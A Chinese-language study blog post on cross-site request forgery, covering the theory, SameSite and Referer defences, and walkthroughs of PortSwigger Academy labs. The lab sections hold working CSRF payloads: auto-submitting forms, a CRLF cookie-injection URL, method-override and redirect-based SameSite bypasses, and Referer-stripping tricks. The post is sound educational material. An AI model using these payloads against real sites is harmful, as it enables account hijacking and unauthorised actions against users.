---
title: "Burp靶场：CSRF 跨站请求伪造"
subtitle: "Burp靶场：CSRF 跨站请求伪造"
summary: "记录学习和题解"
description: "记录学习和题解"
image: ""
date: 2025-11-22
lastmod: 2025-11-22
draft: false
toc:
 enable: true
hiddenFromHomePage: false
weight: false
categories: ["CTF"]
tags: ["Burp靶场"]
---

## 知识

### 原理

跨站请求伪造（**Cross-site request forgery**）是一种漏洞，攻击者可通过该漏洞诱导用户执行非本意的操作。它能让攻击者部分绕过 “同源策略”—— 该策略的设计初衷本是防止不同网站之间相互干扰。

成功的 CSRF 攻击会诱导受害用户执行非本意的操作。例如，修改账户绑定邮箱、更改密码或进行资金转账等。根据操作的性质不同，攻击者可能完全掌控用户账户。若被攻陷的用户在应用中拥有特权角色（如管理员），攻击者则可能全面控制应用的所有数据与功能。

CSRF攻击的实施需满足三个核心前提，攻击者通过构造恶意页面诱导用户触发请求，利用浏览器自动携带的用户凭证完成攻击，具体原理如下：

前提：

1. **存在有价值的目标操作**：应用中存在攻击者值得诱导的操作，可能是特权操作（如修改其他用户权限），也可能是用户专属数据操作（如修改自身密码、绑定邮箱）。
2. **基于Cookie的会话验证**：执行该操作的HTTP请求，仅依赖会话Cookie识别用户身份，无其他会话跟踪或请求验证机制（如无CSRF令牌）。
3. **请求参数可预测**：触发操作的请求中，所有参数值均为攻击者可确定或猜测的内容（例如修改密码时无需知道原密码，仅需提交新密码参数）。

#### 示例

假设某应用的“修改邮箱”功能存在CSRF漏洞，用户执行修改操作时发送的HTTP请求如下：

```http
POST /email/change HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 30
Cookie: session=yvthwsztyeQkAPzeQ5gHgTvlyxHfsAfE

email=wiener@normal-user.com
```
该请求满足上述三大前提：修改邮箱是高价值操作（可后续重置密码劫持账户）、仅通过`session`Cookie验证身份、`email`参数值可由攻击者任意指定。

攻击者创建包含自动提交表单的**HTML页面**，核心代码如下：

```html
<html>
    <body>
        <form action="https://vulnerable-website.com/email/change" method="POST">
            <input type="hidden" name="email" value="pwned@evil-user.net" />
        </form>
        <script>
            document.forms[0].submit(); // 页面加载后自动提交表单
        </script>
    </body>
</html>
```

1. 攻击者诱导受害用户访问该恶意页面（如通过邮件、社交链接发送）；
2. 若用户已登录目标应用，浏览器会自动在请求中携带其`session`Cookie（未启用SameSite Cookie策略时）；
3. 恶意页面自动向目标应用发送“修改邮箱”的POST请求，参数为攻击者指定的邮箱（`pwned@evil-user.net`）；
4. 目标应用**通过Cookie识别**用户身份，将该请求视为受害用户的合法操作，执行邮箱修改。

> CSRF攻击并非仅局限于Cookie-based会话验证，只要应用会自动在请求中添加用户凭证（如HTTP基本认证、基于证书的认证），均可能出现CSRF漏洞。

### 攻击构造

手动创建CSRF漏洞利用所需的HTML代码较为繁琐，尤其是当目标请求包含大量参数或存在其他特殊格式要求时。构造CSRF利用代码最简单的方式，是使用Burp Suite Professional内置的**CSRF PoC生成器**，操作步骤如下：

1. 在Burp Suite Professional中，选中任意你想要测试或利用的请求；
2. 右键点击该请求，在上下文菜单中选择「Engagement tools（渗透测试工具）」→「Generate CSRF PoC（生成CSRF验证代码）」；
3. Burp Suite会自动生成一段HTML代码，这段代码可触发选中的请求（不包含Cookie——受害用户的浏览器会自动添加Cookie）；
4. 你可以在CSRF PoC生成器中调整各类选项，对攻击细节进行优化。部分特殊场景下（如请求存在特殊格式要求），可能需要通过这些选项适配请求特性；
5. 将生成的HTML代码复制到一个网页中，在已登录目标漏洞网站的浏览器中打开该网页，验证目标请求是否成功发起，且预期操作是否执行。

### 触发方式

CSRF攻击的交付机制与反射型XSS基本一致，核心是让受害用户触发恶意请求，具体方式如下：

**一、常规交付方式**（依赖外部网站）

1. 攻击者将恶意HTML代码部署到自己控制的网站；
2. 通过邮件、社交媒体消息等方式，向受害用户发送该网站的链接，诱导其访问；
3. 若恶意代码被植入热门网站（如用户评论区），攻击者无需主动诱导，只需等待用户自然访问该网站即可触发攻击。

**二、简化交付方式**（无需外部网站，GET请求场景）

部分简单的CSRF漏洞可通过GET方法触发，此时攻击可被封装为漏洞网站的单个URL，无需依赖外部站点：
- 攻击者直接构造恶意URL，将攻击参数嵌入查询字符串；
- 诱导用户访问该恶意URL，浏览器会自动发送GET请求触发攻击；
- 示例：若“修改邮箱”功能支持GET请求，攻击URL可直接封装为图片标签（用户访问含该标签的页面即触发）：
  ```html
  <img src="https://vulnerable-website.com/email/change?email=pwned@evil-user.net">
  ```

### 防御手段

如今，发现并利用CSRF漏洞往往需要绕过目标网站、受害浏览器或两者均部署的反CSRF机制。以下是最常见的防护手段：

**1. CSRF令牌**（CSRF Tokens）

- 核心机制：服务器端生成唯一、保密且不可预测的令牌，并传递给客户端；
- 防护逻辑：客户端执行敏感操作（如提交表单）时，必须**在请求中**包含正确的CSRF令牌；
- 防护效果：攻击者无法知晓合法令牌值，难以构造有效的恶意请求，防护效果显著。

```html
常见的隐含 CSRF 令牌的方式
<form name="change-email-form" action="/my-account/change-email" method="POST">
    <label>Email</label>
    <input required type="email" name="email" value="example@normal-website.com">
    <input required type="hidden" name="csrf" value="50FaWgdOhi9M9wyna8taR1k3ODOR8d6u">
    <button class='button' type='submit'> Update email </button>
</form>
```

**2. SameSite Cookie**

- 核心机制：浏览器的安全机制，用于决定网站Cookie是否在跨站请求中携带；
- 防护逻辑：敏感操作通常需要携带已认证的会话Cookie，合适的SameSite限制可阻止跨站请求携带该Cookie；
- 浏览器默认行为：2021年起Chrome浏览器默认强制执行Lax级别的SameSite限制，该标准后续有望被其他主流浏览器采纳。

**3. 基于Referer的验证**

- 核心机制：部分应用利用HTTP Referer请求头防御CSRF，验证请求是否来自应用自身域名；
- 防护效果：整体有效性低于CSRF令牌验证，易被绕过（如Referer可被篡改或隐藏）。

#### Samesite防御

判断两个 URL 是否属于**同一源（origin）站**，需满足三个 “完全一致”：

1. 协议（scheme）相同（如均为 HTTP 或 HTTPS）；

2. 域名（domain name）相同；

3. 端口（port）相同（注：端口通常可由协议推导，如 HTTP 默认 80 端口、HTTPS 默认 443 端口）。

   ![image-20251122202750517](https://raw.githubusercontent.com/calendar0917/images/master/image-20251122202750517.png)

##### **Strict**

若 Cookie 设置了`SameSite=Strict`属性，浏览器**不会在任何跨站请求中携带该 Cookie**。简单来说，只要请求的目标网站与浏览器地址栏中当前显示的网站不一致，浏览器就不会包含该 Cookie。

这种模式**推荐用于具备数据修改权限或执行其他敏感操作的 Cookie**（例如，用于访问仅认证用户可进入的特定页面的 Cookie）。

尽管这是安全性最高的选项，但在需要跨站功能的场景中，可能会对**用户体验**产生负面影响（例如跨站登录、第三方平台嵌入功能会因 Cookie 无法携带而失效）。

##### **Lax**

Lax 级别的 SameSite 限制意味着，浏览器仅在同时满足以下两个条件时，才会在跨站请求中**携带该 Cookie**：

1. 请求使用 GET 方法；
2. 请求由用户的**顶层导航**触发（例如点击链接跳转页面）。

这意味着：

- 跨站 POST 请求不会携带该 Cookie（按最佳实践，POST 请求通常用于执行数据修改或状态变更操作，是 CSRF 攻击的主要目标）；
- 后台请求（如脚本发起的 AJAX 请求、iframe 嵌入请求、图片等资源引用请求）也不会携带该 Cookie。

Lax 模式平衡了安全性与用户体验：既通过阻断高风险跨站请求（POST、后台请求）的 Cookie 携带，抵御大部分 CSRF 攻击；又允许正常的跨站 GET 导航（如点击第三方网站的链接跳转到目标网站）携带 Cookie，保障跨站访问的可用性（例如用户从博客链接跳转至电商网站时，仍能保持登录状态）

##### **None**

若Cookie设置了`SameSite=None`属性，则**完全禁用SameSite限制**（不受浏览器类型影响）。因此，浏览器会在所有指向该Cookie所属网站的请求中携带该Cookie——即便请求是由完全无关的第三方网站触发的。

> 除Chrome浏览器外，其他主流浏览器在设置Cookie时若未显式指定SameSite属性，**默认行为等同于SameSite=None**（但目前Chrome已默认采用Lax模式，该差异需开发者重点关注）。
>

存在合理的场景需要禁用SameSite限制，例如：Cookie本身用于第三方上下文（如跨站嵌入的功能、第三方统计），且不授予持有者访问任何敏感数据或功能的权限。典型示例为**跟踪Cookie**（用于用户行为分析、广告投放等场景）。

**`Secure`属性强制要求**：现代浏览器（如Chrome 80+、Firefox 79+）规定，设置`SameSite=None`的Cookie必须同时添加`Secure`属性（仅在HTTPS请求中携带），否则Cookie会被浏览器拒绝。示例：

```http
Set-Cookie: tracking-id=abc123; SameSite=None; Secure
```

### 攻击手段

#### CSRF

看 Lab

#### Samesite

##### get 绕过 Lax

利用 get 请求

实际场景中，服务器并非总会严格校验特定接口接收的是GET还是POST请求——即便是预期接收表单提交的接口也不例外。如果服务器为会话Cookie设置了Lax限制（无论是显式配置，还是因浏览器默认策略生效），攻击者仍可诱导受害者浏览器发起GET请求，实施CSRF攻击。

只要该请求触发了**顶层导航**，浏览器就会携带受害者的会话Cookie。以下是发起此类攻击最简单的方法之一：
```javascript
<script>
    document.location = 'https://vulnerable-website.com/account/transfer-payment?recipient=hacker&amount=1000000';
</script>
```

> `document.location`会触发浏览器地址栏的页面跳转（顶层导航），符合SameSite Lax允许携带Cookie的条件，这是绕过的核心前提

即便普通GET请求被服务器拒绝，部分**框架**也提供了覆盖请求行中指定方法的手段。例如，Symfony框架支持在表单中使用`_method`参数，该参数会优先于常规请求方法，作为路由匹配的依据：

```html
<form action="https://vulnerable-website.com/account/transfer-payment" method="POST">
    <input type="hidden" name="_method" value="GET">
    <input type="hidden" name="recipient" value="hacker">
    <input type="hidden" name="amount" value="1000000">
</form>
```

其他框架也提供了各类类似的参数，可实现相同的请求方法覆盖效果。

##### 重定向绕过 Strict

如果 Cookie 设置了 `SameSite=Strict` 属性，浏览器将不会在任何**跨站请求（cross-site requests）** 中携带该 Cookie。但如果你能找到一个**攻击载体（gadget）**，使其触发同站点内的**二次请求（secondary request）**，则可能绕过这一限制。

一种可行的攻击载体是**客户端重定向（client-side redirect）** —— 它利用攻击者可控的输入（如 URL 参数）动态构造重定向目标。相关示例可参考我们关于**基于 DOM 的开放重定向（DOM-based open redirection）** 的资料。

在浏览器看来，这类客户端重定向并非真正意义上的 “重定向”：最终发起的请求会被视为**普通的独立请求（ordinary, standalone request）**。关键在于，该请求属于**同站点请求（same-site request）**，因此会携带与该站点相关的所有 Cookie，不受任何 `SameSite` 限制的影响。

若你能操控此攻击载体触发恶意的二次请求，即可**完全绕过（bypass completely）** 所有 `SameSite` Cookie 限制。

需注意：**服务器端重定向（server-side redirects）** 无法实现此类攻击。因为在这种情况下，浏览器会识别出 “跟随重定向的请求” 最初源自跨站请求，因此仍会执行相应的 Cookie 限制策略。

##### 新颁发 Cookie 绕过 Strict

设置了SameSite Lax限制的Cookie，通常不会在任何跨站POST请求中被发送，但存在一些例外情况。

如前所述，若网站在设置Cookie时未添加SameSite属性，Chrome浏览器会默认自动应用Lax限制。不过，为避免破坏单点登录（SSO）机制，Chrome在**顶级POST请求**的前120秒内，并不会实际强制执行该限制。这就导致出现了一个两分钟的窗口期，在此期间用户可能会遭受跨站攻击。

> [!NOTE]
>
> 这个两分钟的窗口期**不适用于**那些被显式设置了`SameSite=Lax`属性的Cookie。

试图精准把控攻击时机，使其落在这个短暂的窗口期内，在实操中多少有些**不切实际**。但另一方面，如果你能在目标站点找到一个攻击载体，迫使受害者的浏览器被**颁发一个新的会话Cookie**，就可以在发起主攻击前，抢先刷新受害者的Cookie。例如，完成一次基于OAuth的登录流程时，每次都可能生成新的会话——因为OAuth服务并不一定会知晓用户是否仍在目标站点保持登录状态。

若想让受害者无需手动重新登录就能触发Cookie刷新，你需要借助**顶级导航**，这能确保与用户当前OAuth会话相关的**Cookie被携带**。但这又带来了一个额外的挑战：你需要将用户重定向回你的站点，才能发起跨站请求伪造（CSRF）攻击。

> 顶级导航：指直接在浏览器地址栏发起、或通过顶级导航（如页面跳转）触发的POST请求，区别于嵌套在iframe中的跨站POST请求，Chrome对其有120秒的Lax限制豁免期

此外，你也可以在**新标签页中**触发Cookie刷新，这样浏览器就不会在你发起最终攻击前离开当前页面。这种方法存在一个小问题：浏览器会阻止弹窗标签页，除非它们是通过用户的手动交互打开的。例如，以下弹窗代码默认会被浏览器拦截：

```javascript
window.open('https://vulnerable-website.com/login/sso');
```

要绕过这一限制，你可以将该语句封装在点击事件处理器中，代码如下：

```javascript
window.onclick = () => {
    window.open('https://vulnerable-website.com/login/sso');
}
```

通过这种方式，只有当用户在页面的某个位置点击时，`window.open()`方法才会被调用。

#### 绕过 Referer

除了采用 CSRF 令牌（CSRF tokens）的防御方式外，部分应用还会利用 **HTTP Referer 头（HTTP Referer header）** 抵御 CSRF 攻击 —— 其核心逻辑通常是验证请求是否源自应用自身的域名。但这种防御方式的有效性普遍较低，且常常存在可被绕过的漏洞。

##### 

HTTP Referer 头（HTTP 规范中存在拼写疏漏，正确英文应为 “Referrer”）是一个**可选请求头**，其内容为 “链接到当前请求资源的网页 URL”。当用户触发 HTTP 请求时（例如点击链接、提交表单），浏览器通常会自动添加该请求头。

目前存在多种方法可让 “发起请求的源页面”**隐藏或修改 Referer 头的值**，这类操作通常是出于隐私保护的目的（例如防止目标站点获取用户的访问来源）。

#### 
##### 空白绕过

部分应用程序的处理逻辑是：**当请求中携带Referer头时，才会对其进行校验；若该请求头被省略，则直接跳过校验**。

在这种情况下，攻击者可以构造特殊的CSRF利用页面，使受害者的浏览器在发送请求时**丢弃Referer头**。实现该效果的方法有多种，其中最简便的是在承载CSRF攻击的HTML页面中，添加一个META标签：

```html
<meta name="referrer" content="never">
```

##### 弱检测

部分应用程序对 Referer 头的校验方式十分简陋，这种校验机制很容易被绕过。例如，若应用仅校验 Referer 中的域名**是否以预期值开头**，攻击者便可将目标域名设置为自身域名的子域名：

```plaintext
http://vulnerable-website.com.attacker-website.com/csrf-attack
```

同理，若应用只是简单校验 Referer**是否包含自身域名**，攻击者只需将目标域名嵌入 URL 的其他位置即可，比如：

```plaintext
http://attacker-website.com/csrf-attack?vulnerable-website.com
```

**注意**尽管你可以通过 Burp 工具发现应用的这种校验行为，但在浏览器中测试对应的概念验证（PoC）代码时，往往会发现这种方法失效。为了降低敏感数据通过 Referer 头泄露的风险，如今许多浏览器**默认会从 Referer 头中剥离查询字符串**。

你可以通过以下方式覆盖这一浏览器行为：确保承载攻击利用代码的响应中，设置了`Referrer-Policy: unsafe-url`响应头（需注意：此处的`Referrer`拼写是正确的 —— 这一细节正是为了检验你是否在认真关注！）。该设置能保证浏览器发送**完整的 URL**，其中包含查询字符串部分。

## Labs

### 无 waf

1.攻击点：抓到更改邮箱的包

```http
POST /my-account/change-email HTTP/2
Host: 0adb00ec04977937805ab22d00ce00dd.web-security-academy.net
Cookie: session=zO38aClXpZPBEVpQ5KWLRyKX8dfvZ8ZR
......

email=111%40qq.com
```

2.攻击：生成 poc 以后，记得勾选自动提交，copy 下 html 以后发送给受害者就可以了。

![image-20251122181211396](https://raw.githubusercontent.com/calendar0917/images/master/image-20251122181211396.png)

```xml
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
    <form action="https://0adb00ec04977937805ab22d00ce00dd.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="111&#64;qq&#46;com" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      history.pushState('', '', '/');
      document.forms[0].submit();
    </script>
  </body>
</html>
```

### 绕过 CSRF 令牌

#### 漏查 GET

1.攻击点：抓更新邮箱的包，发现包含 CSRF 令牌，更改令牌后，请求被拒绝。但是更改请求方式为 Get 以后，又被接受了。

2.攻击：同上，差异在于 `<form>` 标签里的 method，这里没指定的话就是默认 get

#### 漏查无令牌情况

1.攻击点同上

2.攻击：字面意思，就是忘记检查不带 csrf 令牌的情况了，直接删掉就行。

#### 漏查令牌所有者

1.攻击点同上

2.攻击：字面意思，有一个有效令牌就行了，不管是谁的。

> [!NOTE]
>
> csrf 令牌只能使用一次！所以得用新的来生成注入代码

#### 令牌只与 Cookie 绑定

1.攻击点：

```
POST /my-account/change-email HTTP/2
Host: 0a3400ce0428f9d280a203d800fc0048.web-security-academy.net
Cookie: csrfKey=ggJi08btS3rz50WL91sxEL0mMopaNN4z; session=gi9Vh11li133YzoXHVZmM0ON8aIzGsWR
......
Priority: u=0, i

email=111%40qq.com&csrf=7LS37jBoGngLRkbjg8qCmj6TlrhUO05Z
```

发现既有 csrf 又有 csrfKey

2.测试：首先需要验证（两个账号测试），csrf 令牌只与 csrfKey 绑定（而非用户 session），这就给了攻击的可能。我们要做的就是更改用户的 Cookie 以及更改用户的令牌。

3.攻击：替换 Cookie 需要用到 script，`/?search=test%0d%0aSet-Cookie:%20csrfKey=YOUR-KEY%3b%20SameSite=None`，要让受害者访问这个链接，然后配合自己的令牌发包。

> 即如下代码对/r/n url 编码了
>
> ```plaintext
> /?search=test
> Set-Cookie: csrfKey=YOUR-KEY; SameSite=None
> ```

4.payload：

```xml
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
    <form action="https://0a5600ef0353c473804a2671006200c0.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="11111&#64;qq&#46;com" />
      <input type="hidden" name="csrf" value="9TNd8PU7ffxDiebZmAYuVMVsa7eaJAGt" />
      <input type="submit" value="Submit request" />
    </form>
    <img src="https://0a5600ef0353c473804a2671006200c0.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrfKey=sPnN91GwgoWYmf7aLfqYoBRNSXZPuDTn%3b%20SameSite=None" onerror="document.forms[0].submit()">
  </body>
</html>
```

将原本的 script 改成了 img 标签，直接触发

> 1. **`src`的本质是发起 HTTP 请求**：当受害者的浏览器加载这个`<img>`标签时，会自动向`src`中的 URL 发送 GET 请求 —— 这个 URL 就是实验中存在**响应头注入漏洞**的搜索功能。
> 2. **URL 中的`%0d%0a`实现响应头注入**：搜索功能会把`search`参数的内容反射到响应头中，而`%0d%0a`是 HTTP 的回车 + 换行符，会让服务器的响应头被 “拆分”，插入攻击者自定义的`Set-Cookie`头。
> 3. **`onerror`的触发条件**：`<img>`标签的`src`指向的是一个搜索请求的 URL，而非真正的图片资源，服务器返回的响应不是图片格式，因此`<img>`会加载失败，触发`onerror`事件,能确保**Cookie 已经注入完成**，再提交表单。
> 4. **`document.forms[0].submit()`的作用**：触发页面中第一个表单的自动提交 —— 这个表单就是攻击者构造的 “修改邮箱” 的 CSRF 表单（包含攻击者自己的 CSRF 令牌）。

#### 令牌在 Cookie 复用

1.攻击点同上，这里发现了 Cookie 中也出现了 csrf，考虑可能后端只检验了两个 csrf 是否相同

2.攻击：和上一题一样，只需将 Cookie 中的 csrf 改为与表单中提交的 csrf 一样即可。

### 绕过 Samesite

#### Lax

##### Get + _method 绕过

1.攻击点：抓更改邮箱的包，发现并没有明显的限制，无 csrf，也无 samesite 限制，那么就是默认的 Lax 限制，考虑用 Get 绕过

2.测试：直接用 Get 发包，提示只能用 post 方法，于是考虑用 `_method=post` 来欺骗服务器，将 Get 方法识别为 post

`GET /my-account/change-email?email=foo%40web-security-academy.net&_method=POST HTTP/1.1` 成功绕过 post 检测

3.payload:

```xml
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
    <script>
      document.location = "https://0af90060032691628069032c00d40060.web-security-academy.net/my-account/change-email?email=pwned@web-security-academy.net&_method=POST";
    </script>
  </body>
</html>
```

##### 利用新颁发 Cookie 绕过 Oauth

1.攻击点：抓更改邮箱的包，发现没有明显限制。登录过程中，发现需要重定向到 Oauth，并且没有显式指定 Samesite，而且登录时会重新 set 一个 Cookie，所以可以考虑用重定向 + Oauth窗口期来绕过。

2.测试：如果访问更改邮箱地址的时间与登录时间相隔超过 120s，就会更改成功，否则就会重定向到登录界面。所以思路就是，让用户先重定向到登录从而得到新 Cookie 并且外带，然后再提交更改邮箱的请求。

3.攻击：利用函数搭配延迟触发

```xml
<form method="POST" action="https://0a19004c04cb844080140371008500dc.web-security-academy.net/my-account/change-email">
    <input type="hidden" name="email" value="pwned@web-security-academy.net">
</form>
<script>
   window.onclick = () => {
        window.open('https://0a19004c04cb844080140371008500dc.web-security-academy.net/social-login');
        setTimeout(changeEmail, 5000);
    }

    function changeEmail(){
        document.forms[0].submit();
    }
</script>
```



#### Strict

##### 重定向绕过

1.攻击点：抓更新邮箱的包，没有特殊限制，抓登录的包，发现 `Samesite = Strict`，故需要考虑绕过。

2.测试：在主页的发送 post 中，发现在发送评论后，会跳转到确认页面，然后重定向到原来的 post，要怎么利用呢？如果我从确认页跳转到更改邮箱的页面，就可以携带用户的 Cookie 了！

3.攻击：需要搭配路径穿越，重定向到指定网站。如下构造：

```xml
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
    <script>
    document.location = "https://0ada003e03bafa27810c1176007b00da.web-security-academy.net/post/comment/confirmation?postId=1/../../my-account/change-email?email=pwned%40web-security-academy.net%26submit=1";
</script>
  </body>
</html>
```

> 注意，为了保证参数的独立、有效性，需要对 `&` 进行 URL 编码。后面的 submit 是附带的。将原本的 post 请求改为了等价的 get 请求。

##### 子域名 + WebSocket

要先学一下 websocket…… 跳了

#### Referrer 绕过

##### 检测遗漏

1.攻击点：抓更改邮箱的包

2.测试：没有明显的限制，但是发现了有 Referer，更改了以后请求不被接受，删除了以后可以正常发包，绕过了。

3.攻击：添加 meta 标签即可

```html
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
<meta name="referrer" content="never">
  <body>
    <form action="https://0ac000720470f4dc803b1c4600a90089.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="123&#64;qq&#46;com" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      history.pushState('', '', '/');
      document.forms[0].submit();
    </script>
  </body>
</html>
```

##### 检测简陋

1.攻击点：抓更新邮箱的包，发现 Referer，更改内容后无法过检测，但是在前面添加时可以的，推测只要存在原有域名就可以了。找到绕过点。

2.测试：了解到js方法 `history.pushState("", "", "/?0a0f00e8043675cc805ec1b20058002d.web-security-academy.net")`，HTML5 的 History API，用于修改浏览器地址栏 URL 而不触发页面刷新；能够用于构造带目标域名的查询字符串，进而控制 Referer 头内容。但是这样还是会被检测出来，需要再在请求头中添加 `Referrer-Policy: unsafe-url`，否则浏览器会自动剥离 Referer 中的查询字符串。

> 注意 Referrer-Policy 拼写是正确的

3.攻击：更改 js 代码，添加 history api。更改服务器的 Head。发包即可。

```html
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
    <form action="https://0a0f00e8043675cc805ec1b20058002d.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="123654&#64;qq&#46;com" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      history.pushState("", "", "/?0a0f00e8043675cc805ec1b20058002d.web-security-academy.net");
      document.forms[0].submit();
    </script>
  </body>
</html>
```

